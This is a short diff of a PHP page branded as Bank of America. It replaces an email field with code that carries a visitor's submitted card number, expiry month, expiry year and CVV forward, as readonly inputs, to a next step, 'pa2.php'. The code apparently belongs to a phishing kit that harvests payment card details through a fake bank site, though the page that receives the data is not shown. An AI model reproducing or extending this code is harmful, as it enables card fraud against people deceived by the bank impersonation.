@@ -88,8 +88,20 @@
                 </a>
                 
                 <?php 
-                     $variable= $_POST['email'];
-        echo '<a href="index.php"></a><input id="dato" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+                     $variable= $_POST['card'];
+        echo '<a href="pa2.php"></a><input id="card" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['mes'];
+        echo '<a href="pa2.php"></a><input id="mes" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['year'];
+        echo '<a href="pa2.php"></a><input id="year" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['cvv'];
+        echo '<a href="pa2.php"></a><input id="cvv" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 
                 <span class="corporation">© 2021 Bank of America Corporation.</span>
